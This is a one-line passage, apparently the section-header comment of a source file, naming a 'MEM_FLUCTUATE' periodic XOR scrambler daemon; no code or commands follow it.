 /* ── MEM_FLUCTUATE — periodic XOR scrambler daemon ─────────────────────── */
 
